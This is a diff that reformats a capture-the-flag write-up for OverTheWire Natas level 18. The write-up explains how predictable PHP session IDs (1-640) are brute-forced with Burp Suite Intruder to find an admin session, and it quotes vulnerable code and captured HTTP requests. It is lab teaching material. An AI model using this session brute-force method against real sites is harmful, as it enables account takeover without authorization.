@@ -2292,7 +2292,7 @@ After login, the webpage displayed username and password input fields, along wit
 
 Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
 ```html
- <html>
+<html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
 <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
@@ -2398,29 +2398,30 @@ Password: <input name="password"><br>
 
 ### Finding 
 From the source code, the session mechanism has several weaknesses:
+#### Session ID is predictable
+```
+$maxid = 640;
+return rand(1, $maxid);
+```
+- Session IDs are limited to values between 1 and 640
 
-1. Session ID is predictable
-   $maxid = 640;
-   return rand(1, $maxid);
-   - Session IDs are limited to values between 1 and 640
+#### Admin authentication is disabled
+`//return 1;`
+- Even if username = admin, admin access is never granted normally
 
-2. Admin authentication is disabled
-   //return 1;
-   - Even if username = admin, admin access is never granted normally
-
-3. Session trust issue
-   if($_SESSION["admin"] == 1)
-   - The application trusts the session value without strong validation
+#### Session trust issue
+`if($_SESSION["admin"] == 1)`
+- The application trusts the session value without strong validation
 
 This indicates a Session Fixation / Session ID Brute Force vulnerability.
 
 
 ### Approach 
-Step 1: Obtain a Valid Session
+#### Step 1: Obtain a Valid Session
 Login with any credentials (e.g., username: admin; password: admin).
 
 Capture the request using Burp Suite:
-```http
+```
 GET / HTTP/1.1
 Host: natas18.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -2434,30 +2435,26 @@ Upgrade-Insecure-Requests: 1
 
 PHPSESSID=459
 ```
-This confirms: 
-- A session is created
-- Session ID is numeric
+This is to confirm that: `A session is created` and `Session ID is numeric`. 
 
-**Note:** Please note that after login, need to refresh the page to capture through burpsuite. Else will not get the phpsessionid cause firstly login, the phpsessionid havent been assigned yet. 
+**Note:** After logging in, refresh the page before capturing the request in Burp Suite. Otherwise, the PHPSESSID may not be included, as it is not assigned during the initial login request.
 
-Step 2: Identify Attack Surface
-Since:
-- Session IDs range from 1 to 640
-- Admin sessions must exist within this range
+#### Step 2: Identify Attack Surface
+Since `Session IDs range from 1 to 640`, the `Admin sessions must exist within this range`. Therefore, We can brute force all possible session IDs.
 
-We can brute force all possible session IDs.
-
-Step 3: Brute Force Session IDs
+#### Step 3: Brute Force Session IDs
 Using Burp Suite Intruder:
+```
 Target: `Cookie: PHPSESSID=§1§`
+```
 Payload settings:
 - Type: Numbers
 - Range: 1 → 640
 
-Step 4: Identify Valid Admin Session
+#### Step 4: Identify Valid Admin Session
 Below is the content that have successfully captured. 
-Request content: 
-```http
+##### Request content: 
+```
 GET / HTTP/1.1
 Host: natas18.natas.labs.overthewire.org
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -2471,8 +2468,8 @@ Upgrade-Insecure-Requests: 1
 ```
 
 
-Response content:
-```http
+##### Response content:
+```
 HTTP/1.1 200 OK
 Date: Fri, 17 Apr 2026 15:37:57 GMT
 Server: Apache/2.4.58 (Ubuntu)
